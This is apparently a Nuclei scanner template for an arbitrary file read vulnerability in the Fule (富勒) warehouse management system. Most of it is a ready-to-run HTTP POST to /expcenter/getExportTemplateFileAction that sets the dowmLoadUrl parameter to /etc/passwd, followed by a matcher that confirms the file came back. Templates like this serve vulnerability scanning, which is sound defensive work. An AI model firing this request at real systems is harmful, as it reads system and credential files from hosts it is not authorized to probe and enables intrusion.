id: fule-getExportTemplateFileAction-File-reading

info:
  name: 富勒仓储系统 getExportTemplateFileAction 任意文件读取漏洞
  author: fule
  severity: high
  tags: File reading

http:
  - raw:
      - |
        POST /expcenter/getExportTemplateFileAction HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        dowmLoadUrl=/etc/passwd&fileName=
    matchers-condition: and
    matchers:
      - type: regex
        part: body
        regex:
          - 'root:.*:0:0'
      - type: status
        status: 
          - 200